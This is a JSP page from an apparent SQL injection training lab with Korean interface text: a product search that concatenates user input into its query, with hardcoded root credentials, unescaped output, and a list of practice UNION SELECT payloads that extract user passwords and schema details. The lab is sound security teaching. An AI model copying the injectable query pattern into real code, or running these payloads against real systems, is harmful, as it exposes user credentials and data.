<%@ page contentType="text/html;charset=UTF-8" pageEncoding="UTF-8" %>
<%@ page import="java.sql.*" %>
<%--
    SQL Injection Lab - VULNERABLE SEARCH (UNION-based)

    Vulnerable to:
    - UNION SELECT attacks
    - Information schema extraction
    - Column count discovery using ORDER BY
--%>
<%
    String DB_HOST = "jdbc:mysql://127.0.0.1:3306/sqli_lab?useSSL=false&serverTimezone=UTC";
    String DB_USER = "root";
    String DB_PASSWORD = "ntsdev";

    String keyword = request.getParameter("q");
    String message = "";
    String executedQuery = "";
    java.util.List<String[]> results = new java.util.ArrayList<>();

    if (keyword != null && !keyword.trim().isEmpty()) {
        Connection conn = null;
        Statement stmt = null;
        ResultSet rs = null;

        try {
            Class.forName("com.mysql.jdbc.Driver");
            conn = DriverManager.getConnection(DB_HOST, DB_USER, DB_PASSWORD);
            stmt = conn.createStatement();

            // VULNERABLE
            executedQuery = "SELECT id, name, price, description FROM products " +
                            "WHERE name LIKE '%" + keyword + "%' OR description LIKE '%" + keyword + "%'";

            rs = stmt.executeQuery(executedQuery);

            while (rs.next()) {
                results.add(new String[]{
                    rs.getString("id"),
                    rs.getString("name"),
                    rs.getString("price"),
                    rs.getString("description")
                });
            }
        } catch (Exception e) {
            message = "SQL Error: " + e.getMessage();
        } finally {
            try { if (rs != null) rs.close(); } catch (Exception ignored) {}
            try { if (stmt != null) stmt.close(); } catch (Exception ignored) {}
            try { if (conn != null) conn.close(); } catch (Exception ignored) {}
        }
    }
%>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>SQLi Lab - Vulnerable Search (UNION)</title>
    <style>body { font-family: monospace; max-width: 960px; margin: 40px auto; } pre { background:#1a1a1a;color:#0f0;padding:12px;overflow-x:auto; } .box{background:#f8f8f8;padding:15px;border:1px solid #ccc}</style>
</head>
<body>
    <h1>UNION-based SQL Injection (검색)</h1>
    <p>LIKE 검색이 문자열 연결로 되어 있어 UNION 공격에 취약합니다.</p>

    <div class="box">
        <form method="get">
            검색어: <input type="text" name="q" size="50" value="<%= keyword != null ? keyword : "" %>">
            <input type="submit" value="검색">
        </form>
    </div>

    <% if (!executedQuery.isEmpty()) { %>
        <h3>실행된 쿼리:</h3>
        <pre><%= executedQuery %></pre>
    <% } %>

    <% if (!results.isEmpty()) { %>
        <h3>검색 결과 (<%= results.size() %>건)</h3>
        <table border="1" cellpadding="8" style="border-collapse:collapse">
            <tr><th>ID</th><th>Name</th><th>Price</th><th>Description</th></tr>
            <% for (String[] r : results) { %>
                <tr>
                    <td><%= r[0] %></td>
                    <td><%= r[1] %></td>
                    <td><%= r[2] %></td>
                    <td><%= r[3] %></td>
                </tr>
            <% } %>
        </table>
    <% } else if (keyword != null) { %>
        <p>결과가 없습니다.</p>
    <% } %>

    <% if (!message.isEmpty()) { %>
        <p style="color:red"><%= message %></p>
    <% } %>

    <h3>연습 페이로드 (컬럼 4개 맞추기)</h3>
    <pre>
%' UNION SELECT 1, username, password, role FROM users --
%' UNION SELECT id, username, password, secret_note FROM users --
%' UNION SELECT 1, table_name, column_name, 1 FROM information_schema.columns WHERE table_schema='sqli_lab' --
%' UNION SELECT 1, @@version, user(), database() --
    </pre>

    <p>
        <a href="vuln-login.jsp">← 이전</a> |
        <a href="vuln-detail.jsp">다음: Boolean Blind 예제 →</a> |
        <a href="secure-search.jsp">Secure 버전 보기</a>
    </p>
</body>
</html>